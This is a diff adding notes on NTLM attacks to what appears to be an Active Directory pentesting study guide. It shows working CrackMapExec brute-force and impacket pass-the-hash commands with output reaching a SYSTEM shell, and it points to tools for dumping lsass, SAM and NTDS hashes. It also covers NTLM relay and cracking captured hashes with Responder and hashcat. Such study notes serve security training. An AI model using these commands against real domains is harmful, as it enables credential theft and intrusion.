@@ -1051,3 +1051,106 @@ It can also be used for machines in other domains, it must ask to the DC to veri
 ```
 
 #### How do we force NTLM authentication over Kerberos?
+
+A way to force NTLM authentication over Kerberos is to connect to the target machine by using the IP address instead of the hostname, since Kerberos requires the hostname to identify the machine services.
+
+For example the command `dir \\dc01\C$` will use Kerberos to authenticate against the remote [share](https://zer1t0.gitlab.io/posts/attacking\_ad/#shares) while `dir \\192.168.100.2\C$` will use NTLM.
+
+#### **How does NTLM brute-force work?**
+
+We now know that NTLM is used for authenticating, so we could use plenty of tools ([hydra](https://github.com/vanhauser-thc/thc-hydra), [nmap](https://nmap.org/nsedoc/scripts/smb-brute.html), [cme](https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference#using-usernamepassword-lists), or [Invoke-Bruteforce.ps1](https://github.com/samratashok/nishang/blob/master/Scan/Invoke-BruteForce.ps1)) to test for a working password:
+
+```
+$ cme smb 192.168.100.10 -u elfelixio -p passwords.txt 
+SMB         192.168.100.10  445    WS01-10          [*] Windows 10.0 Build 19041 x64 (name:WS01-10) (domain:contoso.local) (signing:False) (SMBv1:False)
+SMB         192.168.100.10  445    WS01-10          [-] contoso.local\anakin:1234 STATUS_LOGON_FAILURE 
+SMB         192.168.100.10  445    WS01-10          [-] contoso.local\anakin:Vader! STATUS_LOGON_FAILURE 
+SMB         192.168.100.10  445    WS01-10          [+] contoso.local\anakin:Vader1234! (Pwn3d!)
+```
+
+We also need to remember that in active directory, authentication works by verifying credentials with the DC so this can lead to account block and will lead to a lot of logs
+
+#### How does pass the hash woks?
+
+Since NTLM calculates the NTLM hash and the session key based on the NT hash, we can use this hash to athenticate and impersonate the user even without cleartext password
+
+{% content-ref url="../../attacking-vectors/methodology/post-compromise-attacks/pass-the-hash.md" %}
+[pass-the-hash.md](../../attacking-vectors/methodology/post-compromise-attacks/pass-the-hash.md)
+{% endcontent-ref %}
+
+On a linux host we could use impacket that accepts the hashes as parameter:
+
+```
+$ psexec.py contoso.local/Anakin@192.168.100.10 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 192.168.100.10.....
+[*] Found writable share ADMIN$
+[*] Uploading file WFKqIQpM.exe
+[*] Opening SVCManager on 192.168.100.10.....
+[*] Creating service AoRl on 192.168.100.10.....
+[*] Starting service AoRl.....
+[!] Press help for extra shell commands
+The system cannot find message text for message number 0x2350 in the message file for Application.
+
+(c) Microsoft Corporation. All rights reserved.
+b'Not enough memory resources are available to process this command.\r\n'
+C:\Windows\system32>whoami
+nt authority\system
+```
+
+#### How do we extract the NT hashes?
+
+To extract NT hashes from lsass you can use [mimikatz sekurlsa::logonpasswords](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-sekurlsa#logonpasswords) command, [dump the lsass process](https://www.c0d3xpl0it.com/2016/04/extracting-clear-text-passwords-using-procdump-and-mimikatz.html) with tools like [procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [sqldumper or others](https://lolbas-project.github.io/#/dump), and copy the dump to your local machine to read it with [mimikatz](https://github.com/gentilkiwi/mimikatz), [pypykatz](https://github.com/skelsec/pypykatz) or [read the dump remotely](https://en.hackndo.com/remote-lsass-dump-passwords/) with [lsassy](https://github.com/Hackndo/lsassy), extract the hashes [from the local SAM database](https://www.hackingarticles.in/credential-dumping-sam/) or the [NTDS.dit database in Domain Controllers](https://www.hackingarticles.in/credential-dumping-ntds-dit/)
+
+#### How does NTLM Relay work?
+
+{% embed url="https://en.hackndo.com/ntlm-relay/" %}
+
+This attack consists in an attacker redirecting the NTLM authentication to a server of its interest to get an authenticated session (Person-in-The-Middle attack)
+
+```
+  client                 attacker               server
+      |                       |                     |
+      |                       |                -----|--.
+      |     NEGOTIATE         |     NEGOTIATE       |  |
+      | --------------------> | ------------------> |  |
+      |                       |                     |  |
+      |     CHALLENGE         |     CHALLENGE       |  |> NTLM Relay
+      | <-------------------- | <------------------ |  |
+      |                       |                     |  | 
+      |     AUTHENTICATE      |     AUTHENTICATE    |  |
+      | --------------------> | ------------------> |  |
+      |                       |                -----|--'
+      |                       |    application      |
+      |                       |     messages        |
+      |                       | ------------------> |
+      |                       |                     |
+      |                       | <------------------ |
+      |                       |                     |
+      |                       | ------------------> |
+      |                       |                     |
+```
+
+Even after getting authenticated, the attacker does not know the session key so if signing is negotiated between client and server, the attacker won't be able to generate valid signatures for the application messages
+
+#### How to crack NTLM hashes?
+
+When trying to do Person-in-The-Middle attacks we could use [Responder.py](https://github.com/lgandx/Responder) or [Inveigh](https://github.com/Kevin-Robertson/Inveigh) to try and grab the hash
+
+{% embed url="https://felix-billieres.gitbook.io/felix-billieres/certification-prep/cpts/active-directory-enumeration-and-attacks/sniffing-out-a-foothold#start-using-inveigh" %}
+You can find some examples here&#x20;
+{% endembed %}
+
+Then we could crack the hash using hashcat and the mode 5600
+
+<figure><img src="../../../.gitbook/assets/image (1054).png" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://felix-billieres.gitbook.io/felix-billieres/certification-prep/cpts/active-directory-enumeration-and-attacks/sniffing-out-a-foothold#using-responder" %}
+you can also find examples of hash cracking here
+{% endembed %}
+
+It's goof to know that NTLMv1 hashes are faster to crack than NTLMv2 hashes since they are created with weaker algorithms.
+
+#### Kerberos <a href="#kerberos" id="kerberos"></a>
+
